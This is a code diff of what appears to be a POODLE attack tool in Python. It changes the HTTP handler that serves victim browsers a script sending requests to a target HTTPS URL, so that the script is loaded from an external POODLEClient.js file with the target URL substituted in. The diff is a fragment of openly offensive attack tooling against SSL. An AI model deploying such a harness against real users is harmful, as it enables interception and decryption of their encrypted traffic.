@@ -114,11 +114,10 @@ class PoodleHTTPRequestHandler(http.server.BaseHTTPRequestHandler):
         response = """<!DOCTYPE html>
         <h1>POODLE Request Generator</h1>
         <script>
-        var xhr = new XMLHttpRequest();
-        xhr.open("POST", "{}");
-        xhr.send(null);
+        """ + jsCode + """
         </script>
-        """.format(args.targetURL)
+        """
+        response = response.replace("###URL###", args.targetURL)
         self.wfile.write(bytes(response, "utf-8"))
 
     def version_string(self):
@@ -164,6 +163,10 @@ if (targetURL.scheme != "https"):
 if (args.target_host == None):
     print("Can't determine target host!");
     sys.exit(2)
+
+jsFile = open("POODLEClient.js", "r")
+jsCode = jsFile.read()
+jsFile.close()
 
 commandQueue = Queue()
 poodleSSLTLSServer = Process(target=ssltlsServer, args=(commandQueue,))
